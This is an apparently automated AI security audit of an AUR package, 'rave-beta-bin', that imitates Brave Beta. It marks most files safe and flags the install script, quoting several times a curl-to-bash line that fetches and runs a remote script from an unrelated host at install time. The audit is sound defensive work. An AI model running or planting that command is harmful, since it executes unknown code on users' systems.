---
package: rave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22770
completion_tokens: 9095
total_tokens: 31865
cost: 0.003727360
execution_time: 56.06
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:06:03Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard AUR .gitignore whitelist; no malicious behavior found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard Brave Beta wrapper script; no malicious behavior found.
  - file: PKGBUILD
    status: safe
    summary: Standard Brave beta packaging with pinned checksums; no malicious behavior found.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop launcher file for Brave Beta; no malicious behavior found.
  - file: .SRCINFO
    status: safe
    summary: Declarative metadata only; official Brave sources with pinned checksums, no malicious behavior.
  - file: rave-beta-bin.install
    status: unsafe
    summary: Remote curl-bash execution in install script is malicious supply-chain behavior.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing rave-beta-bin from local mirror...
Materialized rave-beta-bin
Analyzing rave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD contains only static variable assignments in its global scope. No command substitutions, function calls, or executable code are present at the top level. The `makepkg --printsrcinfo` command simply sources the file, which will only define variables like `pkgver`, `source`, `sha512sums`, etc. None of these operations perform network requests, file downloads, or any other potentially malicious actions. There is no risk in running this command based on the provided content.
</details>
<evidence>
</evidence>
<summary>No dangerous top-level code present.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No dangerous top-level code present.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.gitignore` for an AUR package repository. It ignores all files except a whitelist of packaging-related files (`.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install`, helper scripts, desktop files, and logo). It contains no executable code, performs no network operations, touches no system files, and contains no obfuscated or encoded content. 

The only noteworthy observation is that the whitelisted filenames (`brave-beta-bin.sh`, `brave-browser.desktop`) do not match the package name `rave-beta-bin`, which may indicate the PKGBUILD was adapted from the brave-beta-bin package. This is a provenance/hygiene consideration, but it is not evidence of malice in this file, and the file itself is a passive, inert configuration file.
</details>
<evidence>
</evidence>
<summary>Standard AUR .gitignore whitelist; no malicious behavior found.</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard AUR .gitignore whitelist; no malicious behavior found.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard Chromium-based application launcher wrapper for Brave Browser Beta. It reads an optional user configuration file from `$XDG_CONFIG_HOME/brave-beta-flags.conf`, allows users to pass additional flags via environment variables (`BRAVE_FLAGS`, `FLAG`), sets a default Chrome user data directory, and then executes the packaged binary at `/opt/brave.com/brave-beta/brave-browser`.

There are no network requests, no downloads, no encoded or obfuscated content, no file modifications outside the application scope, and no execution of untrusted remote code. Reading the local user-controlled flags file and passing command-line arguments to the application is expected behavior for this type of wrapper script. The script does not exfiltrate data or perform any system modifications beyond launching the application.
</details>
<evidence>
</evidence>
<summary>
Standard Brave Beta wrapper script; no malicious behavior found.
</summary>
</security_assessment>

[2/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard Brave Beta wrapper script; no malicious behavior found.
[2/7] Reviewing .SRCINFO, PKGBUILD, brave-browser.desktop...
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD downloads the official Brave beta `.deb` package from the project's own GitHub releases, pins SHA-512 checksums for each architecture, extracts the package contents, and installs them into `$pkgdir`. The preparation steps remove an upstream cron directory and patch the desktop entry to use the packaged launcher script — both are normal packaging adjustments. The `chmod 4755` on `chrome-sandbox` is standard for Chromium-based browsers and enables the SUID sandbox helper; it is not an injected backdoor. No obfuscated commands, unexpected network hosts, or suspicious file operations are present. The separate launcher script and `.install` file are not included in this excerpt, but nothing in the PKGBUILD itself indicates malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Standard Brave beta packaging with pinned checksums; no malicious behavior found.</summary>
</security_assessment>

[2/7] Reviewing .SRCINFO, PKGBUILD, brave-browser.desktop, logo.png...
[3/7] Reviewing .SRCINFO, brave-browser.desktop, logo.png...
+ Reviewed PKGBUILD. Status: SAFE -- Standard Brave beta packaging with pinned checksums; no malicious behavior found.
[3/7] Reviewing .SRCINFO, brave-browser.desktop, logo.png, rave-beta-bin.install...
[4/7] Reviewing .SRCINFO, brave-browser.desktop, rave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard freedesktop.org .desktop entry for the Brave Beta web browser. It contains localized name, generic name, and comment strings, plus standard launcher fields such as `Exec=brave-beta %U`, `TryExec=brave-beta`, `Icon=brave-beta`, and MIME type handlers for web content. There is no executable code, no network activity, no obfuscation, and no file operations. The file simply describes how the application should appear in a desktop menu and how it should be launched.

The inclusion of MIME types and URL scheme handlers (`http`, `https`, `ftp`) is normal and expected for a web browser desktop entry. No content in this file attempts to redirect users, alter system settings, download additional payloads, or perform any action beyond defining the application launcher. This is consistent with ordinary packaging practice and contains no supply-chain attack indicators.
</details>
<evidence>
</evidence>
<summary>
Standard desktop launcher file for Brave Beta; no malicious behavior found.</summary>
</security_assessment>

[5/7] Reviewing .SRCINFO, rave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop launcher file for Brave Beta; no malicious behavior found.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` is purely declarative package metadata. It defines a binary package named `rave-beta-bin` that provides `brave-beta-bin` and `brave-beta-browser`, with source URLs pointing to official Brave Browser GitHub releases for `v1.98.47`. Both `.deb` sources and the local helper script `brave-beta-bin.sh` have pinned SHA-512 checksums rather than `SKIP`, so the declared artifacts are not unverified.

The file contains no executable code, no unexpected network destinations, no obfuscated strings, and no file operations. The package name differs from the upstream `brave` branding, which is worth noting as a naming/trust consideration, but the download locations and checksums are consistent with the official Brave project. No evidence of injected malicious behavior or supply-chain tampering exists in this file.
</details>
<evidence>
</evidence>
<summary>
Declarative metadata only; official Brave sources with pinned checksums, no malicious behavior.</summary>
</security_assessment>

[6/7] Reviewing rave-beta-bin.install...
+ Reviewed .SRCINFO. Status: SAFE -- Declarative metadata only; official Brave sources with pinned checksums, no malicious behavior.
LLM auditresponse for rave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This `.install` file contains a top-level command that is executed every time pacman sources the script during package install, upgrade, or removal. That command downloads a shell script from an unrelated host (`web.archive.org` pointing at a `gitflic.ru` project named `hellscripter/install-scripts`) and immediately executes it via `bash <(curl -L ...)`. This is the classic remote code execution / curl-pipe-bash pattern and is not part of standard Arch packaging practice.

The downloaded content is mutable, fetched at install time, and comes from a repository completely unrelated to the `rave-beta-bin` package. The `2>/dev/null` also hides any network or download errors, making the behavior harder for users to diagnose. There is no legitimate packaging reason for an install script to fetch and execute an external script at runtime; this is a supply-chain attack vector.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote curl-bash execution in install script is malicious supply-chain behavior.</summary>
</security_assessment>

Second look for rave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The original verdict stands. The file contains a top-level command in the `.install` script, outside any packaging function, so it executes whenever pacman sources the script. It downloads a script from `web.archive.org` wrapping a `gitflic.ru` project (`hellscripter/install-scripts`) unrelated to the `rave-beta-bin` package and pipes it directly into `bash`. This is exactly the prohibited pattern of downloading and executing code from an untrusted/unexpected host, and it is not upstream application functionality, a standard packaging practice, or a maintainer helper workflow.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote curl-bash in install script remains a genuine supply-chain threat.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed rave-beta-bin.install. Status: UNSAFE -- Remote curl-bash execution in install script is malicious supply-chain behavior.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## rave-beta-bin.install

Status: UNSAFE

Summary: Remote curl-bash execution in install script is malicious supply-chain behavior.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This `.install` file contains a top-level command that is executed every time pacman sources the script during package install, upgrade, or removal. That command downloads a shell script from an unrelated host (`web.archive.org` pointing at a `gitflic.ru` project named `hellscripter/install-scripts`) and immediately executes it via `bash <(curl -L ...)`. This is the classic remote code execution / curl-pipe-bash pattern and is not part of standard Arch packaging practice.

The downloaded content is mutable, fetched at install time, and comes from a repository completely unrelated to the `rave-beta-bin` package. The `2>/dev/null` also hides any network or download errors, making the behavior harder for users to diagnose. There is no legitimate packaging reason for an install script to fetch and execute an external script at runtime; this is a supply-chain attack vector.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,770
  Completion Tokens: 9,095
  Total Tokens: 31,865
  Total Cost: $0.003727
  Execution Time: 56.06 seconds

Final Status: UNSAFE


Issues Found:

rave-beta-bin.install: [UNSAFE] Remote curl-bash execution in install script is malicious supply-chain behavior. / This `.install` file contains a top-level command that is executed every time pacman sources the script during package install, upgrade, or removal. That command downloads a shell script from an unrelated host (`web.archive.org` pointing at a `gitflic.ru` project named `hellscripter/install-scripts`) and immediately executes it via `bash <(curl -L ...)`. This is the classic remote code execution / curl-pipe-bash pattern and is not part of standard Arch packaging practice.

The downloaded content is mutable, fetched at install time, and comes from a repository completely unrelated to the `rave-beta-bin` package. The `2>/dev/null` also hides any network or download errors, making the behavior harder for users to diagnose. There is no legitimate packaging reason for an install script to fetch and execute an external script at runtime; this is a supply-chain attack vector.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
